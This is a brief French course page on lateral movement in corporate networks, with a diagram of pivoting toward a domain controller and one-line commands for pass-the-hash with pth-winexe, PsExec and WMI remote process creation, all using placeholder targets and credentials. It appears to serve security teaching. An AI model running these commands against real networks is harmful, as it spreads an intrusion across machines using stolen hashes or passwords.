# Cours : Lateral Movement - Déplacement Latéral

## 1. Introduction

**Lateral Movement** = Se déplacer d'une machine compromise vers d'autres machines du réseau.

```ascii
RÉSEAU D'ENTREPRISE :

Machine 1 (compromised)  →  Machine 2  →  Machine 3
    ↓                        ↓              ↓
Serveur A                Domain Controller
                              ↓
                         OBJECTIF FINAL
```

## 2. Techniques

### 2.1 Pass-the-Hash

Utiliser le hash NTLM **sans** connaître le mot de passe.

```bash
pth-winexe -U DOMAIN/user%hash //target cmd.exe
```

### 2.2 PSExec

```bash
psexec \\target -u admin -p password cmd.exe
```

### 2.3 WMI

```bash
wmic /node:target /user:admin /password:pass process call create "cmd.exe"
```

## Ressources

- [Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [Pass-the-Hash](https://en.wikipedia.org/wiki/Pass_the_hash)

